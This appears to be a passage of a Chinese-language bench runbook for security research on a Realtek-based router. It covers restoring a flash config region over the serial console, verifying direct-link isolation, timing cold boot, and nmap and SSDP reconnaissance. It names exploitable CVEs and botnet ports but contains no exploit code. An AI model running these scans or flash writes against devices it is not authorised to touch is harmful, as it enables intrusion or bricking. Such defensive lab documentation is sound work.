3. **還原完要重新建立 IoC 基準，而預期值不是 4 / 343 —— 是 23 / 343。**
   2026-08-17 夜實測。這一格本檔原本寫「回到 4 / 343」，**那是錯的**，
   而錯法值得記：差異是**兩個區域之間**的，本節只還原其中一個。
   `4`（出廠與現行本來就不同的欄位）`+ 19`（8/17 那輪 POST 改掉 `COMPCS` 的）
   `= 23`。要回到 4 得連 `COMPCS` 也寫回去，**而那會刪掉這台現在的狀態**，
   不是這一節要做的事。

   > ★ **這個 23 順手成了一個佐證。** 那個 `19` 在 W05 是用 `config-attrib.sh`
   > 比對**兩份快照**得到的；這裡是在**同一份快照裡比對兩個區域**得到的 ——
   > 兩條不共用計算路徑，同一個數字，連具名欄位都對得上
   > （`SSH_ENABLED`、`UPNP_ENABLED`、`PING_WAN_ACCESS_ENABLED`、
   > 三個 `VPN_PASSTHRU_*`、`NOTICE_ENABLED`）。

#### A2.6.1 先量 `EB` 一行吃幾個 byte（**只碰 RAM，一個 byte 都不寫 flash**）

```bash
python3 -u tools/console-write.py probe-eb --at-prompt \
        --sizes 8 16 32 64 -o "$HOME/fwre-work/dumps/w06-eb-probe.json"
```

**預期**（實際數字未知 —— 這一節就是為了量它）：

```text
  ok      8 bytes on one line: 8/8 landed
  ok     16 bytes on one line: 16/16 landed
  fail   32 bytes on one line: 16/32 landed

  ok    EB takes 16 bytes on one line on this unit
        16 KiB would need 1024 EB commands
```

> ⚠️ **`runsheet` 到 2026-08-17 為止只知道「多 byte 形式可以」，不知道上限。**
> 猜錯的代價不是慢，是**一行只進第一個 byte 而其餘被丟掉**，而那在 flash 上
> 看起來就是一份「寫壞了」的設定區。`A2.6.3` 的 RAM 回讀會擋住它，但先量掉更便宜。

> ❌ **一個 byte 都沒進去 → 停。** 灌不進 RAM 就不可能寫得進 flash，而
> `EB` 失敗代表這個 loader 跟 2026-08-17 那次不是同一個行為，先弄清楚為什麼。

#### A2.6.2 用工具自己再演練一次 `0x3F0000`

**`A2.5` 演練的是你的手，這一步演練的是這支工具。** 兩者不能互相取代：
`A2.5` 證明 `FLW` 在這台上的語意，`A2.6.2` 證明**這支程式**送出去的 `FLW` 是對的。

```bash
python3 -u tools/console-write.py drill --at-prompt --eb-bytes 16 \
        -o "$HOME/fwre-work/dumps/w06-drill.json"
```

**預期**：六步全部 `ok`，其中第五步印出 `the first pattern survived -> FLW preserves the sector`。

> 🔴 **第五步印的是 `erase-whole-sector` → 不要繼續。** 那跟 2026-08-17 的量測相反，
> 而兩次量到不同語意的意思是「有一個量錯了」，不是「裝置變了」。回 `A2.5` 手動重做一次。

#### A2.6.3 切出那 16 KiB，並且算它的 sha256

```bash
D="$HOME/fwre-work/dumps"
dd if="$D/config-region-20260817-1102-pre.bin" bs=1 skip=32768 count=16384 \
   status=none of="$D/compds-restore.bin"
sha256sum "$D/compds-restore.bin"
# 對照組：同一段 bytes 從 8/16 的完整 dump 切出來，必須一模一樣
dd if="$D/flash-n150rt-console-1.bin" bs=1 skip=32768 count=16384 \
   status=none | sha256sum
```

**預期**：兩個 sha256 相同。

> 🔴 **`32768` 是 `0x8000`，`16384` 是 `0x4000`，兩個都是十進位** —— `dd` 不吃 `0x`。
> 這台已經用兩種進位制咬過人一次（`FLR` 長度十六進位、`DB` 長度十進位）。

> ❌ **兩個 sha256 不同 → 停，而且不要挑一個來寫。** 兩份副本本來就該相同，
> 不同代表其中一份不是你以為的那一份，**而你正要把它燒進去**。

#### A2.6.4 空跑一次，把要送的命令看過

```bash
python3 tools/console-write.py write --dry-run \
        --flash 0x8000 --confirm 0x8000 --length 0x4000 \
        --input "$HOME/fwre-work/dumps/compds-restore.bin" \
        --expect-sha256 <把 A2.6.3 的 sha256 貼進來> --eb-bytes 16
```

**預期**：`4 sector(s), one FLW each`，然後前 12 行命令。**`FLW` 的參數順序是
`<flash> <RAM> <長度>`，跟 `FLR` 相反 —— 在這裡看一遍就好，不要在真的送的時候才看。**

#### A2.6.5 ★ 寫入

```bash
python3 -u tools/console-write.py write --at-prompt \
        --flash 0x8000 --confirm 0x8000 --length 0x4000 \
        --input "$HOME/fwre-work/dumps/compds-restore.bin" \
        --expect-sha256 <同上> --eb-bytes 16 \
        -o "$HOME/fwre-work/dumps/w06-compds-restore.json"
```

**預期**：正對照通過、四個磁區各自 `staged and verified in RAM` 之後才 `FLW ok`、
最後整段讀回第三個位址比對相同。

> 🔴 **這一步大約要跑 1–3 分鐘（1024 個 `EB` 加 4 個 `FLW`）。**
> **中途不要拔電、不要按 Ctrl-C。** 每個磁區都是讀-改-抹-寫回，
> 斷在中間失去的是那 4 KiB 而不是你正在寫的那幾個 byte。

> ❌ **任何一個磁區停在 `staged RAM does not match` → 那個磁區還沒被寫**，
> 工具就是為了在這裡停。降低 `--eb-bytes` 再跑一次，不要略過。

#### A2.6.6 驗證：重新抓快照，並確認回到 4 / 343

```bash
D="$HOME/fwre-work/dumps"
python3 -u tools/console-dump.py dump --at-prompt \
        --flash 0x0 --length 0x10000 --ram 0x81000000 --chunk 16384 \
        -o "$D/config-region-restored.bin"
cmp "$D/config-region-20260817-1102-pre.bin" "$D/config-region-restored.bin" \
  && echo "IDENTICAL to the pre-sweep snapshot"
bash tools/config-attrib.sh "$D/config-region-20260817-1102-pre.bin" \
                            "$D/config-region-restored.bin"
```

**預期**：`cmp` 說完全相同 —— **注意這比「4 / 343」更強**。
`COMPCS` 那一半是 8/17 POST 輪改過的、**現在也一起被寫回 8/16 的狀態**？
**不是。** 本節只寫 `0x8000`–`0xC000`，`0xC000` 以後沒有動，
所以 `cmp` **會**在 `0xC000` 之後報出差異，而 `0x8000`–`0xC000` 之前必須完全一致。

> 🔴 **所以正確的判據是分段的，不是一個 `cmp`：**
>
> ```bash
> for r in 0:32768 32768:16384 49152:16384; do
>   o=${r%:*}; n=${r#*:}
>   a=$(dd if="$D/config-region-20260817-1102-pre.bin" bs=1 skip="$o" count="$n" status=none | sha256sum | cut -c1-16)
>   b=$(dd if="$D/config-region-restored.bin"          bs=1 skip="$o" count="$n" status=none | sha256sum | cut -c1-16)
>   [ "$a" = "$b" ] && echo "same  $o+$n" || echo "DIFF  $o+$n"
> done
> ```
>
> **預期**：`same 0+32768`（loader 與 `H601` 沒動）、`same 32768+16384`（`COMPDS` 還原了）、
> `DIFF 49152+16384`（`COMPCS` 是 8/17 的現況，本來就該不同）。
>
> ❌ **前兩行任何一行是 `DIFF` → 停。** 尤其第一行：那裡面有 `H601`。

> ⚠️ **`COMPDS` 還原之後，`P9-9`（reset 按鈕）在 W07 才有意義** ——
> 8/17 那次 POST 輪把兩區弄成一樣，reset 的預測因此無法判別。現在可以了。

**2026-08-17 夜實測，整節一次通過：**

```text
region                             8/17 快照          還原後             判定
boot loader 0x0-0x6000             8d305a9afd226084   8d305a9afd226084   same
H601 0x6000-0x8000                 6e2d3233d809ae4c   6e2d3233d809ae4c   same
COMPDS 0x8000-0xC000               7c31b51c88575e2b   7c31b51c88575e2b   same
COMPCS 0xC000-0x10000              4f721579d2a01875   46f9fc090625707e   DIFF
```

`EB` 量到的是**一行 16 bytes**，而失敗的方式才是重點：送 32 個只進去 17 個。
`EB ` + 8 位址 + 空白 = 12 字元，之後每個 byte 3 字元，17 個剛好落在 63 ——
**這個 loader 的命令列緩衝區是 64 bytes，而且它靜靜地截斷**，不報錯。
`A2.6.5` 的 RAM 回讀就是為了擋這件事，而它擋住了：四個磁區每一個都是
`staged and verified in RAM` 之後才 `FLW`。

---

## 第 3 站 · 板子正常開機、web 服務中

**照順序** `A3.1` → `A3.2` → `A3.3` → `A3.4` → `A3.5` → `A3.6` → `A3.7` → `A3.8`
→ `A3.9` → `A3.10` → `A3.11` → `A3.12`

**進站**：從第 2 站拔電 → 停 2 秒 → 上電，**這一次不要送 ESC** → 等 45 秒。
**出站**：拔電，或留著給下一場。

> 🔴 **後四節的順序是硬的，而理由是依賴關係不是危險程度：**
> `A3.9`（注入）要先成立，`A3.10`（flash 差異）才知道自己在量什麼；
> `A3.11`（改密碼）**會毀掉 `A3.6`+`A3.7` 那條 CVE-2019-19822 → 19823 的鏈**，
> 所以它必須排在那兩節之後；`A3.12` 會把 `boa` 弄掉，**所以它排最後**。

> ⚠️ **`A3.1`（網段）其實不需要板子在這一站** —— 它只要板子有電，停在 `<RealTek>` 也算。它排在最前面的理由是 `A3.2` 的輪詢需要位址已經設好。
>
> ⚠️ **為什麼是「等 45 秒」而不是「等 38.76 秒」**：`A3.2` 量到的 38.76 s 是**下界**（t=0 取 console 第一個字元，不是通電那一刻）。45 是可用的形式。

### A3.1 🔌 網段：把網路卡設好，並且**證明**是直連（關 `P1-1`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | 純讀 | [`RUNBOOK` §8.12.4](RUNBOOK.md) | 2026-08-17 |

**先決條件**：`A2.1` 已經把網卡交給 WSL

**這一節做兩件事，而第二件比第一件重要：給網卡一個位址，然後證明封包是直接送到
裝置的，不是繞經別的地方。**

#### A3.1.1 找出介面名字 —— 而它不叫 `eth1`

```bash
ip -br link
```

**預期**（三行，你要的是第三行）：

```text
lo               UNKNOWN        00:00:00:00:00:00 <LOOPBACK,UP,LOWER_UP>
eth0             UP             00:15:5d:xx:xx:xx <BROADCAST,MULTICAST,UP,LOWER_UP>
enxfc19286184c9  DOWN           fc:19:28:61:84:c9 <BROADCAST,MULTICAST>
```

**逐欄解釋：**

| 欄 | 意思 |
|---|---|
| `lo` | loopback，本機自己。永遠在，跟這件事無關 |
| `eth0` | **WSL 自己的虛擬網卡**，通到 Windows 和外網。**不是你要的那個** |
| `enx…` | **USB 網卡。`enx` 後面那串就是它的 MAC** —— 這是 Linux 的「可預測命名」 |
| `DOWN` | 介面還沒啟動（下一步做） |
| `LOWER_UP` | **實體線路已經協商成功**。沒有這個字代表線沒插好、或對端沒上電 |

> 🔴 **它不叫 `eth1`，而這件事害過人。** 2026-08-17 的作業單寫死了 `eth1`，結果
> `Cannot find device "eth1"` 和 `ping 10.1.1.1` **同時成立** —— 因為封包繞經
> Windows 出去了。所以**永遠用 `ip -br link` 問，不要寫死名字**。

#### A3.1.2 啟動介面並給位址

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
echo "iface = $IF"
sudo ip link set "$IF" up
sleep 3
ip -br link show "$IF"
sudo ip addr flush dev "$IF"
sudo ip addr add 10.1.1.100/24 dev "$IF"
ip -br addr show "$IF"
```

**逐行解釋：**

| 行 | 做什麼 |
|---|---|
| `IF="$(…awk…)"` | 抓第一個 `enx` 開頭的介面名字存進變數。`exit` 是「只要第一個」 |
| `ip link set … up` | 啟動介面 |
| `sleep 3` | **等協商。** 乙太網路要一兩秒握手，馬上查會看到還沒 `LOWER_UP` |
| `addr flush` | **清掉舊位址。** 不清的話上一場留下的 `10.1.1.100` 會疊上去，而 `ip addr add` 會回 `File exists` |
| `addr add 10.1.1.100/24` | 給自己一個同網段的位址。`/24` = 遮罩 255.255.255.0 |

**預期**：

```text
iface = enxfc19286184c9
enxfc19286184c9  UNKNOWN        fc:19:28:61:84:c9 <BROADCAST,MULTICAST,UP,LOWER_UP>
enxfc19286184c9  UNKNOWN        10.1.1.100/24
```

> ⚠️ **`UNKNOWN` 不是錯。** 那是 `operstate`，USB 網卡常常回 `UNKNOWN` 而實際上是通的。
> **看的是 `LOWER_UP`，不是 `UP`/`UNKNOWN`。**

> ❌ **`iface = ` 是空的 → 網卡不在 WSL 裡。** 回 `A2.1`，或跑 `make doctor TIER=3`。

> ❌ **沒有 `LOWER_UP` → 線沒插好，或裝置沒上電，或板子停在 bootloader
> 而 Ethernet 還沒初始化。** 板子在 `<RealTek>` 時通常是有的（開機 log 會印
> `---Ethernet init Okay!`），但 `IPCONFIG` 之前它不回應 IP。

**為什麼是 `10.1.1.100`**：這台的 LAN 位址是 `10.1.1.1`（從它自己的 `COMPCS` 解出來的，
不是猜的），DHCP 池是 `10.1.1.100`–`254`。`.100` 在池子裡但不會跟前幾個租約撞。
**如果你的機器不是 `10.1.1.1`**，先解出來：

```bash
"$HOME/fwre-work/venv/bin/python" -m fwrecon compcs \
    "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin" --offset 0xC000 \
    --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
    --disclosure protect -f md | grep -iE '^\| *IP_ADDR|^\| *SUBNET'
```

#### A3.1.3 ★ 證明是直連 —— 這一步是整節的重點

```bash
ip route get 10.1.1.1
```

**預期 —— 必須長成這樣：**

```text
10.1.1.1 dev enxfc19286184c9 src 10.1.1.100 uid 1000
    cache
```

**不可以長成這樣：**

```text
10.1.1.1 via 172.18.128.1 dev eth0 src 172.18.136.170 uid 1000
```

> 🔴 **關鍵字是 `via`。有 `via` 就是繞道，沒有 `via` 才是直連。**
>
> 為什麼這件事致命：如果網卡留在 Windows 側，Windows 會從這台路由器拿到 DHCP
> 位址，而 WSL 的封包會被**路由**過去。在那個狀態下：
>
> - **隔離確認做不了** —— 你抓到的封包是 WSL 虛擬網卡的，不是那條線上的
> - **SSDP / 廣播一定失敗** —— multicast 不跨路由器，而失敗長得跟「服務沒開」一模一樣
> - **兩個來源 IP 會被 NAT 成同一個** —— `A3.7` 的 session 測試整個失效
> - **`nmap -sS` / `-sU` 不可信** —— 你量的是那條路徑，不是裝置
>
> **而 `ping` 會通。** 唯一的破綻是 `ttl=63` 而不是 64 —— 少的那一跳就是路由器。
> 這是 `PROGRESS.md` 的儀器 bug 21,2026-08-17 真的發生過，而它是靠讀路由表發現的，
> 不是靠看 `ping` 成功。

**`tools/bench-probe.py` 每一次執行都自己查這件事**並記進 transcript,
而且對 `ssdp` 那一組**直接拒絕執行**。所以那支工具的結果可以信；手打的不一定。

#### A3.1.4 收尾：記下起點

```bash
cat "/sys/class/net/$IF/statistics/rx_packets"
```

**預期**：`0`

> ⚠️ **這個 `0` 不是問題，是 `A3.3` 的基準。** 那個計數器是 **kernel 自己數的**，
> 跟 `tcpdump` 不共用程式碼 —— 所以它是「這條線到底有沒有東西進來」的第二來源。
> `A3.3` 會再讀一次，而**它必須變大**。

---

### A3.2 🔌 冷開機計時，以及開機後 601 秒的視窗（一次上電餵四項）（關 `P1-12` · `P2-11`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | 純讀 | [`RUNBOOK` §8.12.9](RUNBOOK.md) | 2026-08-17 |

**先決條件**：板子**斷電**；`A3.1` 的網段已設好；console 沒有被別的程式佔用

**一次完整的上電同時交付三樣東西**，所以不要為它們分三次開機：

1. `P1-12` —— 上電到 web 可服務的秒數
2. `P9-1` 的動態半 —— kernel 印（或不印）什麼 cmdline
3. 一份帶時間戳的完整開機 log，之後任何問題都可以回頭查

#### A3.2.1 跑

```bash
bash tools/coldboot-timing.sh /dev/ttyUSB0 10.1.1.1 "$HOME/fwre-work/dumps"
```

**看到這一行才 🔌 插電**（這次**不要**送 ESC，讓它正常開機）：

```text
  ==>   armed.  console -> .../coldboot-…-log
  ==>           http    -> .../coldboot-…-http

        >>> POWER THE ROUTER ON NOW <<<   (no ESC; let it boot)
```

**為什麼要一支腳本而不是兩個終端機：**

| 它做什麼 | 為什麼手做不到 |
|---|---|
| console 每一行蓋一個 `date +%s.%N` | picocom **沒有行內時間戳**，而 `ts` 不是每台機器都有 |
| HTTP 用 `until curl` 硬輪詢，`-m 1` | 沒有 `-m 1` 的話一個卡住的 connect 會吞掉「伺服器起來」那一刻 |
| **兩半用同一個時鐘** | 兩個終端機各自的「我按下 Enter 的時間」不能相減 |
| t=0 取 **console 第一行的時間戳** | 從腳本啟動算，量到的是**你的反應時間** |

#### A3.2.2 讀結果

**預期**：

```text
  ok    first console line at t=0:
  ok    first HTTP 200:
        38.76 s from the console's first line

  ==>   P9-1: the kernel's own report of its command line
  FAIL  the kernel printed no 'Kernel command line:' line at all

  ==>   markers
3:… chipName: UNKNOWN
6:… ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
33:… init started: BusyBox v1.13.4 (2018-01-10 14:56:45 CST)
69:… boa: starting server pid=350, port 80
```

**這台的分段（2026-08-17）**：

```text
+0.00  第一個 console 字元
+0.61  ---RealTek(RTL8196E) v1.3 (400MHz)
+5.84  Jump to image start=0x80500000
+6.91  Uncompressing Linux... done, booting the kernel.
+14.02 init started: BusyBox v1.13.4
+32.50 boa: starting server pid=350, port 80
+38.76 ★ 第一個 HTTP 200
```

> 🔴 **`boa` 印出自己啟動之後，還有 6.26 秒不能服務。**
> 那段時間它在做 `flash extr /web` —— 把 143 個檔案從 flash 解到 ramfs。
> **所以「console 上看到 boa 啟動」不等於「可以開始掃描」。**

> 🔴 **預測是「< 40 秒」，量到 38.76，餘裕只有 1.24 秒 —— 而 t=0 是第一個
> console 字元，不是通電瞬間。** 通電到第一個字元那段沒有量，所以 **38.76 是下界**。
>
> 反證條件寫的是「**明顯**超過 40 秒」，38.76 不是，所以判成立 ——
> **不可以因為餘裕太薄就事後改標準，那正是登記簿要防的事。**
> 但這一項的用途是當「服務沒回應」判定的基準線，**所以可用的形式是「等 45 秒」**，
> 不是「小於 40 秒成立」。

> ⚠️ **那個 `FAIL  the kernel printed no 'Kernel command line:'` 在這台上是預期的，
> 不是你的擷取漏了。** `A1.3.2` 解出的 kernel 裡**根本沒有這個字串** ——
> 所以它永遠印不出來。腳本報 `FAIL` 是對的（它不該假設這台特殊），
> 而**「image 裡沒有那個字串」正是解釋 console 為什麼沒印的那個獨立來源**。

> ⚠️ **也沒有 `Linux version`。** 那個字串**在** image 裡（`A1.3.2` 的對照組會證明），
> 但沒印出來 —— 早期 printk 在這個 build 上是關的。
> **兩件事不同：一個是字串不存在，一個是存在但沒印。** 分清楚。

#### A3.2.3 手做的版本（腳本壞了的時候）

```bash
# 終端機 1:帶時間戳的 console
stty -F /dev/ttyUSB0 38400 cs8 -cstopb -parenb -crtscts -ixon -ixoff raw -echo
while IFS= read -r line; do printf '%s %s\n' "$(date +%s.%N)" "$line"; done \
  < /dev/ttyUSB0 | tee "$HOME/fwre-work/dumps/coldboot-manual.log"

# 終端機 2:輪詢(先跑這個,再插電)
until curl -s -o /dev/null -m 1 http://10.1.1.1/; do sleep 0.2; done
date +%s.%N
```

**然後把終端機 2 印的那個數字，減掉終端機 1 log 第一行的數字。**

> ⚠️ **`stty` 的那一長串不是裝飾。** `-echo` 沒關的話你送的字元會被回傳，
> log 裡會出現重複；`-ixon -ixoff` 沒關的話 `0x11`/`0x13` 這兩個 byte 會被
> 當成流量控制吃掉 —— 而 flash 裡到處都是那兩個 byte。

---

### A3.3 🔌 隔離確認 —— 而且要帶對照組（關 `P0-4`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | 純讀 | [`RUNBOOK` §8.12.5](RUNBOOK.md) | 2026-08-17 |

**先決條件**：`A3.1` 完成，而且 `ip route get` 沒有 `via`

**這一節要證明的是：那條線上只有你和這台裝置，沒有第三個東西，而且它沒有在對外連線。**

#### A3.3.1 為什麼這一節看起來多此一舉，而它不是

**直覺的做法是：抓 45 秒封包，零個封包 = 網段乾淨。**

**2026-08-17 就是這樣做的，而它差點被寫成結論。** 那一刻 kernel 的計數器是
`RX: 0 packets / TX: 12` —— **送得出去，收不回來。** 也就是零封包不是因為網段乾淨，
是因為**那條線根本沒在送東西給你**。

> 🔴 **「抓到零個封包」不是證據，它是兩件事的其中一件，而你分不出是哪一件：**
> （a） 網段乾淨，或 （b） 你的擷取根本沒在工作。
>
> **所以這一節主動製造已知流量。** 「封包數 > 0」就是那次擷取的**對照組** ——
> 它證明擷取是活的，零才有意義。

#### A3.3.2 抓，而且自己製造流量

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
PCAP="$HOME/fwre-work/dumps/lab-$(date +%Y%m%d-%H%M).pcap"
echo "rx before: $(cat "/sys/class/net/$IF/statistics/rx_packets")"

sudo tcpdump -ni "$IF" -w "$PCAP" & TD=$!
sleep 1
ping -c 3 -i 0.3 10.1.1.1 >/dev/null
curl -s -o /dev/null http://10.1.1.1/
sleep 12
sudo kill "$TD"
echo "rx after : $(cat "/sys/class/net/$IF/statistics/rx_packets")"
```

**逐行解釋：**

| 行 | 做什麼 |
|---|---|
| `tcpdump -n` | **不要做反解 DNS。** 不加 `-n` 的話 tcpdump 自己會發 DNS 查詢，而那正是你要找的東西之一 —— **工具會污染自己的量測** |
| `-i "$IF"` | 只聽那一張網卡 |
| `-w "$PCAP"` | 寫成檔案，不要印在螢幕上（要能重看） |
| `& TD=$!` | 丟到背景，記下 PID 等一下殺 |
| `sleep 1` | 讓 tcpdump 真的開始聽再送東西。**不等的話你自己製造的流量會漏掉** |
| `ping -c 3 -i 0.3` | 三個 ICMP，間隔 0.3 秒 —— **這就是對照組流量** |
| `curl … http://…/` | 再加一次 TCP，證明不只 ICMP 在動 |
| `sleep 12` | 留 12 秒安靜期，看有沒有**別的東西**自己冒出來 |

**預期**：

```text
rx before: 0
rx after : 16
```

#### A3.3.3 讀那份 pcap

```bash
tshark -r "$PCAP" 2>/dev/null | wc -l
tshark -r "$PCAP" -T fields -e eth.src 2>/dev/null | sort | uniq -c
tshark -r "$PCAP" -Y dns 2>/dev/null | head
tshark -r "$PCAP" -Y 'ip.dst != 10.1.1.0/24 && ip.src != 10.1.1.0/24' 2>/dev/null | head
```

| 行 | 問什麼 |
|---|---|
| `wc -l` | **總封包數。這是對照組，必須 > 0** |
| `-T fields -e eth.src \| uniq -c` | **來源 MAC 各出現幾次。必須剛好兩個** |
| `-Y dns` | **有沒有 DNS 查詢。必須是空的** |
| `-Y 'ip.dst != …'` | **有沒有對 10.1.1.0/24 以外的流量。必須是空的** |

**預期**：

```text
16
      8 fc:19:28:61:84:c9
      8 14:4d:xx:xx:xx:xx
```
`dns` 和最後那一行**都必須沒有輸出**。

> ✅ **剛好兩個 MAC** = 你的網卡 + 裝置。第一個數字是你在 `A3.1` 看到的 `enx` 後面那串。

> ❌ **第三個 MAC → 停。** 網段上有別的東西。可能是：
> （a） 你插在 switch 上而不是直連 —— 拔掉，一條線直接對接；
> （b） Windows 側還有一個位址在那個網段 —— 檢查 `Get-NetIPAddress` 有沒有 `10.1.1.x`；
> （c） 真的有第三台機器 —— 那就不是隔離網段。

> ❌ **總封包數是 0 → 擷取沒在工作，不是網段乾淨。** 先看 `rx after`：
> 如果它也是 0，那條線沒在送東西給你（`A3.1` 的 `LOWER_UP` 再確認一次）。
> **不要把這個寫成「網段乾淨」。**

> ❌ **有 DNS 或對外流量 → WAN 埠可能插了東西，或裝置在嘗試對外連線。**
> 先確認 WAN 埠是空的。這台在 `wan_disconnect` 時會叫一個 DNS spoof helper,
> 那是登記簿 `P6-10` 的事，還沒有人看過它。

> ⚠️ **per-unit 識別碼（MAC、SSID）不要寫進 repo 裡的檔案。** 跟 W02 把 PCB 條碼
> 塗掉是同一條規則，而 `BENCH-LOG.md` 的標頭跟它自己 2026-08-17 上午那一段
> 正好互相矛盾 —— 那件事還沒決定要往哪邊收。

---

### A3.4 🔌 埠與服務偵察（關 `P1-2` · `P6-11` · `P1-10`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | 純讀 | [`RUNBOOK` §8.12.6](RUNBOOK.md) | 2026-08-17（上午場） |

**先決條件**：`A3.3` 通過；裝置已正常開機並服務（等 45 秒，見 `A3.2`）

#### A3.4.1 掃描前先確認 web 活著 —— 這是對照組，不是禮貌

```bash
curl -s -o /dev/null -m 4 -w 'before: %{http_code}\n' http://10.1.1.1/
```

**預期**：`before: 200`

> 🔴 **為什麼一定要先做這件事。** 這是 400 MHz MIPS、32 MiB RAM 的機器。
> **一次把 `boa` 打掛的掃描，結果看起來會跟「埠都關著」一模一樣** ——
> 65,532 個 `closed`，而你會把它寫成發現。
> **掃描前後各一次，兩次都 200,`closed` 才是裝置的答案而不是你的。**

#### A3.4.2 全 TCP

```bash
D="$HOME/fwre-work/dumps"
sudo nmap -sS -p- --reason -T3 --max-retries 2 -oA "$D/tcp" 10.1.1.1
curl -s -o /dev/null -m 4 -w 'after tcp: %{http_code}\n' http://10.1.1.1/
```

**逐個旗標：**

| 旗標 | 意思 | 為什麼是這個 |
|---|---|---|
| `-sS` | SYN 掃描（送 SYN，看 SYN/ACK，不完成三方握手） | 比 `-sT` 輕，對這台的負擔小 |
| `-p-` | **全部 65,535 個埠** | 因為預測裡有具體的埠號，而「沒掃到」和「關著」不一樣 |
| `--reason` | 印出**為什麼**判定成 open / closed | `closed (reset)` 和 `filtered (no-response)` 是不同的事實 |
| `-T3` | 時序等級 3（預設） | **不要用 `-T4`。** 見下 |
| `--max-retries 2` | 每個埠最多重試兩次 | 預設 10，在慢裝置上會拖到幾十分鐘 |
| `-oA "$D/tcp"` | 同時輸出三種格式（`.nmap` / `.gnmap` / `.xml`） | **證據要留檔，不能只留在螢幕上** |

**預期**（這台 2026-08-17 的答案）：

```text
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
52869/tcp open  unknown syn-ack ttl 64
52881/tcp open  unknown syn-ack ttl 64
Not shown: 65532 closed tcp ports (reset)
```

> 🔴 **不要用 `-T4`。** 在這台上 `-T4` 的併發量足以讓 `boa` 停止回應，
> 而你會得到一份「幾乎全部 closed」的結果 —— 那是你自己造成的。

> ⚠️ **`52869` 與 `52881` 不在任何一條預測裡。** 這是 2026-08-17 的實測發現：
> 預測**點名的每一項都對**（80 開、22/23/5555 關），而**它點名得太少**。
> `52869` 是 `miniigd`（UPnP SOAP），`52881` 是 `wscd`（WPS）。

> 🔴 **`52869` 是 CVE-2014-8361 的埠，而那個 CVE 在 CISA KEV 裡、有公開的武器化程式碼。**
> **這一節只做偵察。不要呼叫任何 SOAP action。**

#### A3.4.3 重點 UDP，以及 IoC 埠

```bash
sudo nmap -sU -p 53,67,69,123,161,162,1900,5353,5555 --reason -T3 -oA "$D/udp" 10.1.1.1
curl -s -o /dev/null -m 4 -w 'after udp: %{http_code}\n' http://10.1.1.1/
sudo nmap -sT -Pn -p 19412,31412,48101,2323,60001,5555,9034,7547 --reason -oA "$D/ioc" 10.1.1.1
curl -s -o /dev/null -m 4 -w 'after ioc: %{http_code}\n' http://10.1.1.1/
```

| 旗標 | 意思 |
|---|---|
| `-sU` | UDP 掃描。**慢，所以只掃指定的九個**，不掃全部 |
| `-sT` | 完整 TCP 連線掃描（三方握手）。IoC 那一組用它，因為要確定「真的沒有東西在聽」 |
| `-Pn` | **跳過主機存活探測。** 不加的話 nmap 可能先 ping，而 ping 不通就整組跳過 |

**預期**：

```text
53/udp   open|filtered domain
67/udp   open|filtered dhcps
1900/udp open|filtered upnp
161/udp  closed        snmp
```
IoC 那八個埠 **全部 `closed`**。

> ⚠️ **`open|filtered` 不是「開著」。** UDP 沒回應時 nmap 分不出「開著但不回」
> 和「被防火牆丟掉」—— 所以它老實說兩種都可能。`53` / `67` 是 DNS 與 DHCP,
> 這台是路由器，合理。

> ❌ **IoC 那八個埠任何一個有回應 → 停，走事件處理程序。**
> 那些埠是公開殭屍網路工具用的（`2323` telnet 變體、`48101` Mirai、
> `7547` TR-069 CVE-2016-10372…）。這個型號在那些工具裡被點名過。
> **有回應不代表被入侵，但它代表你不能再把後面的量測當成乾淨裝置的量測。**

#### A3.4.4 UPnP：banner 說的和 binary 說的不一樣

```bash
printf 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: upnp:rootdevice\r\n\r\n' \
  | nc -u -w3 10.1.1.1 1900
```

或用工具（它會先確認你是直連，不是的話直接拒絕）：

```bash
python3 tools/bench-probe.py ssdp --host 10.1.1.1 -o "$D/ssdp.json"
```

**預期**：

```text
Server: miniupnpd/1.4 UPnP/1.4
Location: http://10.1.1.1:52869/picsdesc.xml
```

**然後去 rootfs 裡找那個 binary：**

```bash
ls -l "$HOME/fwre-work/extracted/unit-2018/squashfs-root/bin/" | grep -iE 'upnp|igd'
strings -a "$HOME/fwre-work/extracted/unit-2018/squashfs-root/bin/miniigd" \
  | grep -iE 'miniupnpd|MiniIGD'
```

**預期 —— 而這是這一節最重要的一件事：**

```text
-rwxr-xr-x 1 ... 97100 ... miniigd
Server: miniupnpd/1.4 UPnP/1.4
MiniIGD %s (%s).
/etc/miniigd.conf
```

> 🔴 **rootfs 裡只有 `/bin/miniigd`，`mini_upnpd` / `miniupnpd` 這兩個 binary 不存在**
> —— 而那個 banner 字串就在 `miniigd` 自己的字串表裡。
>
> **只讀 banner 會查錯一整組 CVE。** `miniigd` 是 Realtek 的
> （CVE-2014-8361,CISA KEV）；`miniupnpd` 是完全不同的專案、不同的 CVE 歷史。
> **登記簿 `P1-10` 事先就要求分辨這一點，而那才是它存在的理由。**

> ⚠️ **`nc` 在這台裝置上不存在，但你的主機上要有。** 沒有的話用上面那個工具版本。

---

### A3.5 🔌 HTTP GET 那幾輪 —— 用工具，不要手打（關 `P1-3` · `P1-5` · `P1-8` · `P2-1` · `P2-2` · `P2-3` · `P2-4` · `P2-5` · `P3-13`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **純讀**（全部是 GET;POST 在 `A3.8`） | [`RUNBOOK` §8.12.7](RUNBOOK.md) | 2026-08-17 |

**先決條件**：`A3.1` 直連；裝置已服務

#### A3.5.1 為什麼是工具，不是 curl

**一次打錯的 POST 會讓 `boa` 死掉，然後後面 57 個端點全部回「連不上」——
而那看起來跟「端點不存在」一模一樣。** 一次手滑，57 個端點的普查變成 57 個偽陰性。

`tools/bench-probe.py` 擋掉這件事，而且它做四件手打做不到的事：

